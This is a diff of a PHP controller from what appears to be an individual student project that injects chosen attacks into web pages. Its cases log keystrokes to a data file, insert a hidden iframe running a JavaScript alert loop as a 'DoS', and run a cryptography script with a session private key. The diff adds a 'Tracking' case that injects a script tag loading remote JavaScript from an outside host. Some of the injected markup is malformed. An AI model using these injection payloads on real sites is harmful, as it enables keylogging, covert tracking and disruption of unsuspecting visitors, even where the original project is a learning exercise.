@@ -2,6 +2,7 @@
 session_start();
 include "../php/BaseController.php";
 $typeOfAttack = (string)$_SESSION['Type'];
+$privateKey = $_SESSION['privateKey'];
 $textToInsert="";
 switch($typeOfAttack){
     case "Key":
@@ -19,9 +20,7 @@ switch($typeOfAttack){
            $logfile = fopen('../php/data.txt', 'a+');
            fwrite($logfile, $data );
            fclose($logfile);
-          //depends on location / this ip for good result 12.215.42.19 ;
           runScript($textToInsert);
-
           break;
     case "Dos":
           $textToInsert="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
@@ -36,7 +35,14 @@ switch($typeOfAttack){
           break;
 
     case "Cryptography":
-          runCryptographyScript();
+
+          runCryptographyScript($privateKey);
+          break;
+
+    case "Tracking":
+          $TrackingScript = "http://individualproject.esy.es/js/tracking.js";
+          $textToInsert="script type='text/javascript' src='$TrackingScript'</script>";
+          runScript($textToInsert);
           break;
     default:
           $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
